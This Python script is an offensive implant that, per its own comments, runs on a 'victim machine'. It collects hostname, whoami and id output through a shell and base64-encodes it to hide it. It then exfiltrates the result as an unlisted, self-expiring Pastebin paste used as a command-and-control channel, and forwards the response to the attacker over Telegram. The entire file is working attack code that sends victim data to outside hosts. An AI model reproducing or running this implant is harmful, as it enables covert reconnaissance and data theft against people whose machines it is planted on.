from decouple import config
import sys
from subprocess import Popen, PIPE
import base64
from requests.api import post
import telegram_send

def sendData(data, key, url):
    postData = {
        "api_dev_key": key,                         # unique API Developers Key
        "api_option": "paste",                      # paste, to set a new paste
        "api_paste_code": data,                     # data or text that will be posted
        "api_paste_name" : "Pastebin Sebagai C&C",  # title of the paste
        "api_paste_expire_date" : "10M",            # paste will be expired in 10 minutes
        "api_paste_private": 1                      # 1, so the paste will be unlisted
    }

    # post or send the data into pastebin
    response = post(url, data=postData)

    # since the program will run in the victim machine, we will redirect the output into our telegram using telegram bot
    telegram_send.send(messages=[response.text])

def encrypt(data):
    # encrypt the data in base64 so it can't be seen easily
    return base64.b64encode(data)

def hostRecon():
    # to get the hostname, logged user, and current privilege based on the victim operating systems
    if sys.platform == "win32":
        commands = ["hostname", "whoami"]
    elif sys.platform == "linux":
        commands = ["hostname", "whoami", "id"]

    result = b""

    for command in commands:
        # to run the command inside cmd / terminal
        process = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        output, error = process.communicate()

        # to separate between command
        result += b"\n%s\n" % command.encode()
        result += b"[================================================================================================================]\n"

        if output != b"":
            result += output
        else:
            result += error
        
    return encrypt(result)

def main():
    APIkey = config("APIkey")
    url = "https://pastebin.com/api/api_post.php"

    hostData = hostRecon()
    sendData(hostData, APIkey, url)

if __name__ == "__main__":
    main()